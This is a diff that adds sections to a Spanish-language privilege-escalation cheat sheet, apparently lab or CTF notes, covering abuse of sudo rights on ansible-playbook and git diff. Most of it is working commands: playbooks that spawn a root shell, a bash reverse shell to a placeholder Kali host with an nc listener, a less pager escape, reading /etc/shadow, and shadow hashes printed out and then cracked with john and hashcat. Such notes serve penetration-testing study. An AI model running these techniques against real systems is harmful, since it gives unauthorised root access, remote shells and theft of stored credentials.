@@ -267,3 +267,67 @@ Paso 4:
 # Shell como root directamente 
 ❯ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
 ```
+
+### Ansible-playbook 
+```bash 
+❯ sudo -l 
+# Ejecutar 'ansible-playbook' como root sin password
+(root) NOPASSWD: /usr/bin/ansible-playbook
+
+# Verificar que funciona 
+Paso 1: En el server víctima 
+❯ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/test
+
+Paso 2: En el server víctima 
+❯ ansible-playbook /tmp/test
+```
+
+```bash 
+# Ejecutar la revershell 
+Paso 0: Crear el documento en el server víctima '/tmp/'
+# El contenido de 'bash.sh' es el siguiente:
+	#!/bin/bash
+	/bin/bash -i >& /dev/tcp/<IP_KALI>/443 0>&1
+
+Paso 1: En el server víctima 
+❯ echo '[{hosts: localhost, tasks: [shell: /bin/bash /tmp/bash.sh]}]' > /tmp/test
+
+Paso 2: En Kali
+❯ rlwrap nc -nlvp 443
+
+Paso 3: En el server víctima 
+❯ sudo ansible-playbook /tmp/test
+```
+
+### GIT
+* [Git Pager](https://www.mslinn.com/git/200-git-pager.html)
+* [shell](https://gtfobins.org/gtfobins/less/#shell)
+```bash 
+❯ sudo -l 
+# Ejecutar 'git' como root sin password
+(root) /usr/bin/git diff *
+
+TIP:
+	- Se debe hacer la pantalla de la terminar más pequeña para que se active 'less' automáticamente, de lo contrario mostrará el resultado en toda la pantalla
+
+Opción 1:
+❯ sudo git diff /dev/null /etc/shadow   # Leer el shadow
+
+# Una vez activado less hacer lo siguiente:
+❯ !/bin/bash   # Obtener shell como root 
+```
+
+```bash 
+Opción 2:
+❯ sudo git diff /dev/null /etc/shadow   # Leer el shadow
+
+root:$y$j9T$657OMfr6U/YjHANR9zqGF/$7/o1A4oiREjV5TUVNlutMlGGJZKkKjd49L7nXxnqLPC:20597:0:99999:7:::
+gilbert:$y$j9T$..2DaLRiELO0/2IEFPJ1y.$.QIOG7UYb0MxFecst8ub.dGENZLO6xXO9eDAX8d5hGA:20597:0:99999:7:::
+
+Utilizar esto solo en hashcat:
+	$y$j9T$657OMfr6U/YjHANR9zqGF/$7/o1A4oiREjV5TUVNlutMlGGJZKkKjd49L7nXxnqLPC
+
+# Crackear
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash.txt
+❯ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
